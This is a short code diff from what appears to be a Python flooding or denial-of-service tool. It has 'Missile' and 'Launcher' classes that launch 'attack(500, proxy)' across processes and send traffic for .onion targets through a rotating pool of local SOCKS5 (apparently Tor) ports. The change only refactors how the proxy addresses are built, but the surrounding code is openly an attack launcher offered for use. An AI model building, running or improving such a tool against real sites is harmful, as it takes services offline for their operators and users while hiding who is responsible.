@@ -14,10 +14,7 @@ from aiohttp_socks import ProxyConnector
 from multiprocessing import Process
 
 
-socksPort = ["socks5://127.0.0.1:9152", "socks5://127.0.0.1:9154", "socks5://127.0.0.1:9156",
-		"socks5://127.0.0.1:9158", "socks5://127.0.0.1:9160", "socks5://127.0.0.1:9162",
-		"socks5://127.0.0.1:9164", "socks5://127.0.0.1:9166", "socks5://127.0.0.1:9168",
-		"socks5://127.0.0.1:9170"]
+socksPort = ["9152", "9154", "9156", "9158", "9160", "9162", "9164", "9166", "9168", "9170"]
 
 class Missile:
 	def __init__(self, target: str):
@@ -117,7 +114,7 @@ class Launcher:
 
 	def controller(self, cpu_count_number, target, duration):
 		try:
-			proxy = proxy = socksPort[cpu_count_number % len(socksPort)] if ".onion" in target else ""
+			proxy = ("socks5://127.0.0.1:" + socksPort[cpu_count_number % len(socksPort)]) if ".onion" in target else ""
 			missile = Missile(target)
 			asyncio.run(missile.attack(500, proxy))
 		except Exception as e:
